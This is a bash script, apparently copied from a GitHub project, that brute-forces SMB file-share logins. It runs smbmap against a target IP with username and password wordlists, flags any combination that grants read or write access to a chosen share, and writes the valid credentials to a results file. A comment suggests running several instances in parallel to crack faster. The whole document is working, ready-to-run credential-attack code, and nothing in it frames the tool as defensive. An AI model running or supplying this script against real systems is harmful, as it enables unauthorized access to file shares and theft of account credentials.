# https://github.com/yufongg/SMB-Fileshare-Bruteforce
# Split the username wordlist into parts & run multiple instance of this script to have faster results
#!/bin/bash
GREEN='\033[0;32m'
NC='\033[0m'
if [ "$#" != 4 ]; then
	echo "Usage: ./smb_bruteforce.sh <ip_addr> <username/username wordlist> <password wordlist> <fileshare>"
else
	if [[ -f $2 ]]; then
		for usernames in $(<$2);
		do 
			for passwords in $(<$3);
			do
				echo "Try: ${usernames} + ${passwords}";
				if [[ $(smbmap -H $1 -u ${usernames} -p ${passwords} | grep $4 | grep -P '(WRITE|READ)') ]]; 
				then
					echo -e "${GREEN}Found Valid Combination ${usernames}:${passwords}${NC}";
					echo "${usernames}:${passwords}" >> Results.txt
				fi
			done
		done
	else 
		for passwords in $(<$3);
		do
			echo "Try: $2 + ${passwords}";
			if [[ $(smbmap -H $1 -u $2 -p ${passwords} | grep $4 | grep -P '(READ\sONLY|WRITE|READ)')  ]]; 
			then
				echo -e "${GREEN}Found Valid Combination $2:${passwords}${NC}";
				echo "$2:${passwords}" >> Results.txt
			fi
		done

	fi
fi
